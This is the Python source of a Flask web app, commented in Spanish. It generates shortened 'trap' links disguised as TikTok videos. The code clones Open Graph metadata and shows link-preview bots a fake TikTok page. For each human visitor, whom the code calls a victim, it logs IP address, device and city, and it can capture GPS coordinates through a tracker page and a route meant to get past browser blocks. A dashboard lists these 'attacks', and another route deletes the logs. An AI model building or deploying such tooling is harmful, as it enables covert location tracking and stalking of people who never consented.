import os
import random
import string
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, jsonify, redirect, render_template, session
from datetime import datetime, timedelta
import psycopg2 

app = Flask(__name__)

# --- CONFIGURACIÓN DE SEGURIDAD CRÍTICA ---
# Usamos una llave fija para que el servidor no olvide tu sesión al reiniciarse
app.secret_key = "llave_maestra_segura_y_permanente_2025"

# Tu contraseña de administrador
# Intenta leerla de Railway, si no existe, usa '1234'
ADMIN_PIN = os.environ.get("ADMIN_PIN", "1234") 

DATABASE_URL = os.environ.get("DATABASE_URL")

# Configuración para engañar a TikTok (Web Scraping)
HEADERS_FALSOS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Language': 'es-ES,es;q=0.9',
}

def get_db_connection():
    if not DATABASE_URL: return None
    try:
        conn = psycopg2.connect(DATABASE_URL)
        return conn
    except Exception as e:
        print(f"Error conectando DB: {e}")
        return None

# --- INICIALIZACIÓN DE BASE DE DATOS ---
def inicializar_db():
    try:
        conn = get_db_connection()
        if conn is None: return
        cur = conn.cursor()
        
        # Tabla de Trampas
        cur.execute("""
            CREATE TABLE IF NOT EXISTS trampas (
                id SERIAL PRIMARY KEY,
                token VARCHAR(50) UNIQUE NOT NULL,
                nombre VARCHAR(100),
                url_destino TEXT,
                meta_titulo TEXT, meta_desc TEXT, meta_img TEXT,
                usar_gps BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT NOW()
            );
        """)
        
        # Tabla de Intrusos
        cur.execute("""
            CREATE TABLE IF NOT EXISTS intrusos (
                id SERIAL PRIMARY KEY,
                trampa_id INTEGER REFERENCES trampas(id),
                ip_address VARCHAR(45),
                user_agent TEXT,
                city VARCHAR(100),
                lat TEXT, lon TEXT, accuracy TEXT,
                captured_at TIMESTAMP DEFAULT NOW()
            );
        """)
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e: print(f"Error DB Init: {e}")

@app.route('/update_db_schema')
def update_db_schema():
    # Protegido: Solo si está logueado
    if not session.get('logged_in'): return redirect('/login')
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("ALTER TABLE trampas ADD COLUMN IF NOT EXISTS usar_gps BOOLEAN DEFAULT FALSE;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lat TEXT;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS lon TEXT;")
        cur.execute("ALTER TABLE intrusos ADD COLUMN IF NOT EXISTS accuracy TEXT;")
        conn.commit()
        cur.close()
        conn.close()
        return "<h1>✅ Base de Datos Actualizada</h1>"
    except Exception as e: return f"❌ Error: {e}"

# --- HERRAMIENTAS ---
def generar_token():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

def obtener_ubicacion(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        data = response.json()
        if data['status'] == 'success':
            return f"{data['city']}, {data['country']}"
        else:
            return "Desconocida"
    except:
        return "Error Geo"

def acortar_link(url_larga):
    try:
        api_url = f"https://is.gd/create.php?format=simple&url={url_larga}"
        response = requests.get(api_url, timeout=4)
        if response.status_code == 200:
            return response.text.strip()
        return url_larga
    except:
        return url_larga

def clonar_metadatos(url_destino):
    try:
        response = requests.get(url_destino, headers=HEADERS_FALSOS, timeout=4)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        t = soup.find("meta", property="og:title")
        d = soup.find("meta", property="og:description")
        i = soup.find("meta", property="og:image")
        
        t_f = t["content"] if t else "Video Viral"
        d_f = d["content"] if d else "Haz clic para ver"
        i_f = i["content"] if i else "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95c4d0840c83a04.png"
        
        return t_f, d_f, i_f
    except:
        return "Video", "Ver video", ""

# ==========================================
# SISTEMA DE LOGIN (SEGURIDAD)
# ==========================================

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        try:
            data = request.json
            pin_ingresado = data.get('pin')
            
            # Verificación del PIN
            if str(pin_ingresado) == str(ADMIN_PIN):
                session['logged_in'] = True
                session.permanent = False # Expira al cerrar navegador
                return jsonify({"status": "ok"})
            else:
                return jsonify({"status": "error", "mensaje": "PIN Incorrecto"}), 401
        except Exception as e:
            print(f"Error Login: {e}")
            return jsonify({"status": "error"}), 500
            
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

# ==========================================
# RUTAS DEL DASHBOARD (PROTEGIDAS 🔒)
# ==========================================

@app.route('/')
def home():
    if not session.get('logged_in'): return redirect('/login')
    return render_template('index.html')

@app.route('/api/borrar_logs', methods=['POST'])
def borrar_logs():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("DELETE FROM intrusos;")
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "mensaje": str(e)}), 500

@app.route('/api/crear_trampa', methods=['POST'])
def crear_trampa():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    
    try:
        d = request.json
        n = d.get('nombre', 'Trampa')
        u = d.get('url_destino', '')
        gps = d.get('usar_gps', False)
        mt = d.get('meta_titulo', '')
        md = d.get('meta_desc', '')
        mi = d.get('meta_img', '')
        
        if not mt: mt, md, mi = clonar_metadatos(u)
        
        tok = generar_token()
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO trampas (token, nombre, url_destino, meta_titulo, meta_desc, meta_img, usar_gps) VALUES (%s, %s, %s, %s, %s, %s, %s)", 
            (tok, n, u, mt, md, mi, gps)
        )
        conn.commit()
        cur.close()
        conn.close()
        
        link_final = acortar_link(f"{request.host_url}s/{tok}")
        return jsonify({"status": "ok", "link": link_final})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/ver_ataques', methods=['GET'])
def ver_ataques():
    if not session.get('logged_in'): return jsonify({"error": "Auth required"}), 401
    
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            SELECT t.nombre, i.ip_address, i.captured_at, i.user_agent, i.city, i.lat, i.lon
            FROM intrusos i JOIN trampas t ON i.trampa_id = t.id
            ORDER BY i.captured_at DESC LIMIT 50
        """)
        ataques = cur.fetchall()
        cur.close()
        conn.close()
        
        resultado = []
        for a in ataques:
            # Corrección horaria (GMT-5 Ecuador)
            hora_ecu = a[2] - timedelta(hours=5)
            
            resultado.append({
                "trampa": a[0],
                "ip": a[1],
                "hora": hora_ecu.strftime("%H:%M %d/%m"),
                "dispositivo": a[3],
                "ubicacion": a[4] if a[4] else "Desconocida",
                "lat": a[5],
                "lon": a[6]
            })
        return jsonify(resultado)
    except: return jsonify([])

# ==========================================
# RUTAS PÚBLICAS (TRAMPAS) - ABIERTAS 🌍
# ==========================================

@app.route('/s/<token>')
def trampa_activada(token):
    ip_victima = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_victima and ',' in ip_victima: ip_victima = ip_victima.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent')
    ubicacion = obtener_ubicacion(ip_victima)
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id, url_destino, meta_titulo, meta_desc, meta_img, usar_gps FROM trampas WHERE token = %s", (token,))
    trampa = cur.fetchone()
    
    if not trampa: return redirect("https://google.com")
    
    trampa_id, url_final, m_t, m_d, m_i, usar_gps = trampa
    
    # Detección de Bots
    ua_str = str(user_agent).lower()
    es_bot = "facebook" in ua_str or "whatsapp" in ua_str or "telegram" in ua_str or "twitter" in ua_str
    
    if not es_bot:
        cur.execute("INSERT INTO intrusos (trampa_id, ip_address, user_agent, city) VALUES (%s, %s, %s, %s)", 
                   (trampa_id, ip_victima, user_agent, ubicacion))
        conn.commit()
    
    cur.close()
    conn.close()

    # Si es un bot, mostramos el disfraz
    if es_bot:
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta property="og:type" content="website">
            <meta property="og:site_name" content="TikTok">
            <meta property="og:title" content="{m_t}">
            <meta property="og:description" content="{m_d}">
            <meta property="og:image" content="{m_i}">
            <meta name="twitter:card" content="summary_large_image">
        </head>
        <body></body>
        </html>
        """

    # Si es humano y tiene GPS activado
    if usar_gps:
        return render_template('tracker.html')
    else:
        return redirect(url_final)

@app.route('/api/save_gps', methods=['POST'])
def save_gps():
    data = request.json
    token = data.get('token')
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id FROM trampas WHERE token=%s", (token,))
    res = cur.fetchone()
    if res:
        tid = res[0]
        # Actualizamos el último registro
        cur.execute("""
            UPDATE intrusos SET lat=%s, lon=%s, accuracy=%s 
            WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)
        """, (str(data['lat']), str(data['lon']), str(data['acc']), tid, tid))
        conn.commit()
    cur.close()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/api/save_gps_bounce', methods=['GET'])
def save_gps_bounce():
    # Método de rebote para saltar bloqueos de navegador
    t = request.args.get('token')
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    acc = request.args.get('acc')
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT id, url_destino FROM trampas WHERE token = %s", (t,))
    res = cur.fetchone()
    
    url_final = "https://tiktok.com"
    if res:
        tid, url_final = res[0], res[1]
        cur.execute("""
            UPDATE intrusos SET lat=%s, lon=%s, accuracy=%s 
            WHERE trampa_id=%s AND id=(SELECT MAX(id) FROM intrusos WHERE trampa_id=%s)
        """, (lat, lon, acc, tid, tid))
        conn.commit()
        
    cur.close()
    conn.close()
    return redirect(url_final)

@app.route('/redirect/<token>')
def redirect_final(token):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT url_destino FROM trampas WHERE token = %s", (token,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return redirect(res[0] if res else "https://tiktok.com")

inicializar_db()

if __name__ == '__main__':
    app.run(debug=True, port=5000)